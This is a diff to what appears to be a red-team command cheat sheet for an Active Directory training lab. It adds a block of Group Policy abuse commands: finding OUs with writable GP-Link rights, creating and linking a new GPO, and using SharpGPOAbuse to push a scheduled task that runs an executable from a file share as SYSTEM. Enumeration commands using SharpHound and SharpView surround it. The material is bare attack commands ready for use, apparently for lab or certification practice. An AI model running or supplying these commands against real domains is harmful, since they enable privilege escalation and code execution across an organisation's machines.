@@ -345,6 +345,12 @@ PowerShell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHo
 Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
 Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
 
+#GPO
+PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+PowerShell Find-DomainShare -CheckShareAccess
+PowerShell New-GPO -Name 'comemeloshuevos2' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'  
+Assembly  /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\nuevo5.exe\" --GPOName \"comemeloshuevos2\""
+ 
 
 
 
